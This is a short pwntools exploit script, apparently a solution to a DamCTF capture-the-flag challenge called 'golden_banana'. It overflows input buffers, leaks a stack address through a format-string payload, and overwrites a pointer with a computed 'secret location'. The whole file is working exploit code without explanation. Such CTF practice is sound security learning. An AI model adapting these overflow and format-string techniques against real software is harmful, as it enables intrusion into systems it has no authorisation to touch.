from pwn import *
context.arch = "amd64"

# io = remote('chals.damctf.xyz', 30234)
io = process("./golden_banana")
if args.GDB:
	gdbscript="""
	c
	"""
	gdb.attach(io, gdbscript=gdbscript)

io.sendline(b'1')
io.sendline(b'1')

payload = b'A'*1024 # input_buf
for i in range(2):
	payload += b'B'*1024 # location.description

	for i in range(4):	# choices
		payload += b'A'*1024 # description
		payload += b'B'*8	 # *location
	payload += b'%lx-'*2 # num_choices
	payload += b'%lx-'*2  # end_location


io.sendline(payload)
io.sendline(b'2')
sleep(2)
io.clean()
io.sendline(b'2')

leak = io.recvline().split(b'-')
stack_addr = int(leak[2], 16)
secret_location = stack_addr + 0xddb8
log.info(f"stack leak is {hex(stack_addr)}")
log.info(f"secret location {hex(secret_location)}")

payload += b'A'*1008
payload += b'B'*1024 # choice description
payload += p64(secret_location) # location
io.sendline(payload)

io.sendline(b'1')

io.interactive()